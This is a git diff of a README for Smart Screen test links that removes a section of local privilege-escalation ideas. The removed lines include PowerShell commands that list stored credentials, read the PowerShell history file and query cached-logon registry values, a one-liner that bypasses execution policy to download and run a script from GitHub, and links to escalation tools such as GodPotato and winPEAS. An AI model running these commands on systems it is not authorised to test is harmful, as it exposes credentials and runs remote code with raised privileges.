@@ -115,36 +115,4 @@ A collection of Smart Screen test links to evaluate various behaviors, including
 
 ![image](https://github.com/user-attachments/assets/51b37e58-4553-47c9-b601-fc73f5acf75a)
 
-## Ideas for LPE
-
-The following commands and tools provide potential avenues for exploring local privilege escalation methods. They include registry checks, credential queries, and accessing Windows Subsystem for Linux (WSL) binaries.
-
-```powershell
-// password policy
-net accounts
-
-cmdkey /list
-type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
-
-// privescCheck.ps1
-powershell -ep bypass -c "Invoke-Expression -Command (Invoke-RestMethod 'https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
-```
-
-Review WSL for permissions and exploits  
-
-```
-C:\Windows\System32\bash.exe
-C:\Windows\System32\wsl.exe
-```
-
-- [RunasCs](https://github.com/antonioCoco/RunasCs)
-- [EnableAllTokenPrivs](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1)
-- [GodPotato](https://github.com/BeichenDream/GodPotato)
-- [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)
-
-- [Invoke-UAC](https://github.com/BlackShell256/Invoke-UAC)
-
-
-
 
